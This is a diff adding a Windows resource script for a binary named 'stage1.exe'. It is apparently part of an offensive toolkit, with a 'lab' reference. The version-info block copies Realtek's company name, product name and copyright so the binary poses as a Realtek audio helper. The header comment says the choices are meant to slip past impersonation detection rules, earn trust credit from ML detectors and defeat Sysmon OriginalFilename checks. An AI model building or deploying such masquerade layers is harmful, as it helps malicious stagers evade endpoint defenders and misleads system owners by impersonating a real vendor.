@@ -1,0 +1,59 @@
+/*
+ * Resource script for stage1.exe (S34 cosmetic layer).
+ *
+ * Persona: Realtek HD Audio Manager Helper. Chosen per research wave
+ * (versioninfo-mimicry-detection_RESEARCH.md, 2026-04-23) -- niche OEM
+ * baseline avoids Microsoft-impersonation detection rules while still
+ * delivering the ML trust-signal bonus of populated metadata.
+ *
+ * OriginalFilename matches the planned deployed filename (RtkAudHlpr.exe)
+ * to defeat Sysmon EID 1 OriginalFilename != basename(Image) rules.
+ *
+ * Windres (MinGW) compiles this into a COFF object with a .rsrc section;
+ * the linker folds it into the final PE. Compiled + linked by the S34
+ * Makefile under the `windows` target.
+ */
+
+#include <winresrc.h>
+#include <winuser.h>
+
+/* --- VS_VERSION_INFO (RT_VERSION, id = 1) -------------------------- */
+
+1 VERSIONINFO
+FILEVERSION     6,0,9501,1
+PRODUCTVERSION  6,0,9501,1
+FILEFLAGSMASK   VS_FFI_FILEFLAGSMASK
+FILEFLAGS       0
+FILEOS          VOS_NT_WINDOWS32
+FILETYPE        VFT_APP
+FILESUBTYPE     VFT2_UNKNOWN
+BEGIN
+    BLOCK "StringFileInfo"
+    BEGIN
+        BLOCK "040904B0"
+        BEGIN
+            VALUE "CompanyName",     "Realtek Semiconductor Corp."
+            VALUE "FileDescription", "Realtek HD Audio Manager Helper"
+            VALUE "FileVersion",     "6.0.9501.1"
+            VALUE "InternalName",    "RtkAudHlpr"
+            VALUE "OriginalFilename","RtkAudHlpr.exe"
+            VALUE "ProductName",     "Realtek HD Audio"
+            VALUE "ProductVersion",  "6.0.9501.1"
+            VALUE "LegalCopyright",  "Copyright (C) Realtek Semiconductor Corp."
+        END
+    END
+    BLOCK "VarFileInfo"
+    BEGIN
+        VALUE "Translation", 0x0409, 0x04B0
+    END
+END
+
+/* --- Application manifest (RT_MANIFEST, id = 1) ------------------- */
+
+1 RT_MANIFEST "manifest.xml"
+
+/* --- Application icon (RT_GROUP_ICON, id = 1) --------------------- */
+/* Lab placeholder icon -- see README "Cosmetic Layer" for rationale
+ * and how to swap in a real extracted icon. */
+
+1 ICON "icon.ico"
